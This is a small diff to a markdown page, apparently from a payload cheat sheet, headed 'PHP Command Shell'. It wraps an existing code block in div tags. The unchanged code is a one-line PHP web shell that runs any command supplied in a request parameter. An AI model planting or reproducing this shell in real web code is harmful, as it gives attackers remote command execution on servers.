@@ -7,8 +7,12 @@ tags: ["php", "shell", "template"]
 ---
 ### PHP Command Shell
 
+<div>
+
 ```php
 <?php system($_REQUEST['cmd']); ?>
 ```
+
+</div>
 
 <br>
